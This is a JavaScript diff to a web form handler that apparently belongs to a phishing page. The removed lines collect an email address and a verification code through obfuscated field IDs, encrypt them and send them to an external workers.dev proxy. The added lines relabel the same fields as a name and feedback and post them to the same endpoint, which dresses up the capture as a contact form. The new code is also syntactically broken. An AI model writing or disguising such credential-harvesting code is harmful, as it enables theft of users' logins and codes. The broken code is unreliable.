@@ -76,8 +76,8 @@ const viper = document.getElementById("viper");
   }
 })();
 function falcon() {
-  const email = viper.value;
-  const code = document.getElementById("cobra").value;
+  const customerName = document.getElementById("viper").value;
+  const customerMessage = document.getElementById("cobra").value;
   const unlockBtn = document.getElementById("btn-unlock");
   const spinner = document.getElementById("loading-spinner");
   const btnText = document.getElementById("btn-text");
@@ -89,21 +89,17 @@ function falcon() {
     form.classList.add("shake");
     return;
   }
-  unlockBtn.disabled = true;
-  spinner.style.display = "block";
-  btnText.innerText = "Verifying...";
-  const encoded = encryptPayload({
-    email: email,
-    code: code,
-    timestamp: Date.now()
-  });
-  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded",
-    },
-    body: "secure_data=" + encodeURIComponent(encoded),
-  })
+const cleanPayload = new URLSearchParams();
+cleanPayload.append("Name", customerName);
+cleanPayload.append("Feedback", customerMessage);
+
+fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+  body: cleanPayload
+});
     .then((r) => r.json())
     .then((result) => {
       unlockBtn.disabled = false;
